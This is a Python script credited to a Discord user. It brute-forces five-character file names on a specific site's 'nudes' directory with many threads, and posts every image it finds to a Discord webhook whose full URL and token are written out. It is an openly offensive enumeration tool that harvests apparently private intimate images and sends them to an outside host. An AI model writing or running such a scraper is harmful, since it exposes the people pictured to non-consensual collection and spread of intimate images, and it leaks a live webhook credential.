import random
import requests
import threading
import time
from os import system
from itertools import permutations

# Made by Timxxx#0248
###############################

url = "https://niklas.ovh/nudes" # https://url.com/
ext = ".png"
fileNameLength = 5 # https://url.com/xxxxx.png/
webhook = "https://discord.com/api/webhooks/891076968689319936/IzhwlcaAQG97-0_2XJuC0mQAVkftoXBPIgF9k_JBbTWZRDfa72yQ6ynSwNBcgCLO2iHI"
verboose = True
name = "timxxx"

###############################

chars = "abcdefghijklmnopqrstuvwxyz1234567890"
combis = permutations(chars, fileNameLength)
urls = 1
valid = []
threads = {}
errorIndexes = []

lastIndex = 0

name = "(" + name + ")" if name != "" else ""

threadCount = input("Thread count: ")
if threadCount.isdigit:
    threadCount = int(threadCount)
    threadcount = 250 if threadCount > 250 else threadCount
else:
    threadCount=1

# validate url
if url[len(url)-1] != "/": url += "/" 
index = 0

def sendToWebhook(_url, modified, threadIndex):
    if webhook != "":
        global name
        data = {"content": f"{modified} {name} index: {urls}\n{_url}"}
        response = requests.post(webhook, json=data)
        print(f"[{urls}] Url got sent to to webhook ({response.status_code}) | {_url} : Thread #{threadIndex}")

def generateRandUrl(length=5):
    fileName = "".join(combis.__next__())
    return url + fileName + ext

def isValid(_url):
    request = requests.head(_url)
    return (request.status_code == 200, request)

def testUrl(_url, threadIndex):
    _valid, request = isValid(_url)
    global urls 

    if _valid:
        sendToWebhook(_url, request.headers.get("last-modified"), threadIndex)
        valid.append(_url)
    else:
        if verboose: print(f"[{urls}] Nothing found on {_url} ({request.status_code}): Thread #{threadIndex}")
        elif request.status_code != 404: print(f"[{urls}] Weird {_url} ({request.status_code}): Thread #{threadIndex}")
    urls += 1

def searchForUrls(threadIndex):
    print(f"Thread #{threadIndex} is starting")
    time.sleep(5)
    try:
        while True:
            testUrl(generateRandUrl(fileNameLength), threadIndex)
    except:
        print(f"An error occured in thread #{threadIndex}")
        del(threads[threadIndex])
        errorIndexes.append(threadIndex)


print("Getting last index")
try:
    with open(".index", "r") as file:
        content = file.read()
        if  content.isdigit():
            lastIndex = int(content)
        else:
            file.close()
            print("Index was invalid")
            man = input("Enter last index manually ('enter' for 0): ")
            lastIndex = 0 if man == "" else int(man)
            with open(".index", "w") as file:
                file.write(str(lastIndex))
except:
    print("No last index was found.")
    man = input("Enter last index manually ('enter' for 0): ")
    lastIndex = 0 if man == "" else int(man)
    with open(".index", "w") as file:
        file.write(str(lastIndex))

currentIndex = 0
def skipToIndex():
    global currentIndex
    while currentIndex <= lastIndex:
        currentIndex += 1
        combis.__next__()

print("Skipping to last index")

for i in range(threadCount):
    thread = threading.Thread(target=skipToIndex)
    thread.start()

while currentIndex < lastIndex: time.sleep(1)

print("Skipped to last index: " + str(lastIndex))
urls = currentIndex
print("Starting to search...")
time.sleep(5)

for i in range(threadCount):
    threads[i+1] = threading.Thread(target=searchForUrls, args=(i+1,))
    threads[i+1].start()

while True:
    system(f"title Url #{urls}")
    if len(errorIndexes) > 0:
        time.sleep(2)
        for i in errorIndexes:
            print(f"Restarting thread #{i}")
            threads[i] = threading.Thread(target=searchForUrls, args=(i,))
            threads[i].start()
    time.sleep(10)